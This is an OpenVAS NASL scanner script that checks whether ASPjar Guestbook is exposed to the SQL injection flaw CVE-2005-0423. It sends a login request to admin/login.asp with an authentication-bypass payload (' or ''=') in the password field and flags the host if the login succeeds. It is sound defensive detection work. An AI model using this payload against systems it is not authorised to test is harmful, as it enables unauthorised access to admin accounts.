# OpenVAS Vulnerability Test
# $Id: aspjar_sql_injection.nasl 17 2013-10-27 14:01:43Z jan $
# Description: ASPjar Guestbook SQL Injection
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2005 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running ASPJar's GuestBook, a guestbook 
application written in ASP.

The remote version of this software is vulnerable to a SQL
injection vulnerability which allows a remote attacker to 
execute arbitrary SQL statements against the remote DB.

It is also vulnerable to an input validation vulnerability which
may allow an attacker to perform a cross site scripting attack using
the remote host.";

tag_solution = "Delete this application.";

# ASPjar guestbook (Injection in login page)
# farhad koosha <farhadkey@yahoo.com>
# 2005-02-10 21:05

if(description)
{
 script_id(16389);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2005-0423");
 script_bugtraq_id(12521, 12823);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");
 
 name = "ASPjar Guestbook SQL Injection";

 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Checks for the presence of an SQL injection in login.asp";
 
 script_summary(summary);
 
 script_category(ACT_ATTACK);
 
 script_copyright("This script is Copyright (C) 2005 Noam Rathaus");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

function check(loc)
{
 req = string("POST ", loc, "/admin/login.asp?Mode=login HTTP/1.1\r\n",
 			  "Host: ", get_host_name(), ":", port, "\r\n",
			  "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20050110 Firefox/1.0 (Debian package 1.0+dfsg.1-2)\r\n",
			  "Accept: text/html\r\n",
			  "Accept-Encoding: none\r\n",
			  "Content-Type: application/x-www-form-urlencoded\r\n",
			  "Content-Length: 56\r\n\r\n",
			  "User=&Password=%27+or+%27%27%3D%27&Submit=++++Log+In++++");
 
 r = http_keepalive_send_recv(port:port, data:req, bodyonly: 1);
 if( r == NULL )exit(0);

 if("You are Logged in!" >< r && "Login Page" >< r)
 {
  security_warning(port);
  exit(0);
 }
}


foreach dir (cgi_dirs())
{
 check(loc:dir);
}
